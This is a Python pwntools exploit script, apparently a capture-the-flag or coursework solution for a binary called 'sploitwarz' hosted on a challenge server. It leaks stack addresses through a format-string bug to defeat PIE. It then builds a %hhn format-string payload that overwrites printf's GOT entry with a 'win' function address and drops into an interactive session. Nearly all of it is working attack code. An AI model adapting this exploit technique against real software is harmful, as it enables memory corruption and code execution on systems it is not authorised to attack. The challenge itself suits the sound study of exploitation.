from pwn import *
import re

def splitByte4(byte4, *, littleEndian = True):
    assert(type(byte4) is int)
    result = []
    while byte4:
        result.append(byte4 & 0xFF)
        # result = [byte4 & 0xFF, *byte4]
        byte4 >>= 8
    return result if littleEndian else result[::-1]

def packFmt(byteArray, pad=0):
    items = [(byteArray[i], i) for i in range(len(byteArray))]
    return sorted(items, key=lambda t: (t[0] - pad) & 0xFF)

def genFmt(byte4, where, stackStart):
    payload = b''
    payload += p32(where+0)
    payload += p32(where+1)
    payload += p32(where+2)
    payload += p32(where+3)
    dataLen = len(payload)
    packedValues = packFmt(splitByte4(byte4), dataLen)
    for value in packedValues:
        change = (value[0] - dataLen) & 0xFF
        part = f'%{change}c'.encode() if change else b''
        payload += part
        payload += f'%{stackStart + value[1]}$hhn'.encode()
        dataLen += change
    return payload


# do_gamble :: 0x000015d2  ebp-0x234
"""
strncpy(ebp-0x234 <?>, arg1+0x14 <var_248>, 0x100 <256>)
"""

def do_gamble():
    p.recv()
    p.sendline('g')
    p.sendline('0.00001')
    p.sendline('5')
    p.recvuntil('\n> \n')
    result = p.recvline(keepends=False)
    if b"i still havn't watched avengers" in result:
        return True
    p.sendline('')
    match = re.match(b'Well done, (.+?)! You win .*', result)
    return match.groups()[0] if match else False

def __set_handle(name):
    if len(name) > 255:
        print("Payload limit reached!")
        import sys
        sys.exit(1)
    p.sendline(name)

def do_handle(name):
    p.sendline('c')
    __set_handle(name)
    
def leak(handle=None):
    if handle is not None:
        do_handle(handle)
    while 1:
        result = do_gamble()
        if result: return result


if __name__ == "__main__":
    p = process("./sploitwarz")
    p = remote('plsdonthaq.me', 4004)

    p.recvuntil(" your handle?\n> ")
    __set_handle(b"z5206677") # Wow is this proof of work :o

    # PIE randomises the address of each memory segment, but the relative addresses remain the same
    # leak("%1$p") -> The address of the buffer, but it's stored in a different region to the code
    # leak("%2$p") -> The pushed value 0x100
    # leak("%3$p") -> Some value `0x156d` away from the program base

    # The third item on the stack is an address in the program base memory region
    # As offsets are static (and only the base shifts), if we can leak the address (which we can),
    # then we can calculate the base
    leaked = int(leak("%3$p"), 16)
    base = leaked - 0x156d
    print(f"Calculated program base = {hex(base)}")
    
    # We can get the win address by adding the win address offset to the base
    win_offset = 0xab4
    win_addr = base + win_offset
    print(f"Calculated win address = {hex(win_addr)}")

    # We can get the printf@GOT address by adding the printf@GOT entry address offset to the base
    printf_got_offset = 0x3528
    printf_got_address = base + printf_got_offset
    print(f"Calculated printf@GOT address = {hex(printf_got_address)}")

    # Now we want to perform a format string vulnerability to change printf@GOT to point to the win function
    # The fifth stack item contains the contents of our buffer, so we can write our addresses in through %5$n, %6$n, %7$n, %8$n
    leak(genFmt(win_addr, printf_got_address, 5))
    p.interactive()
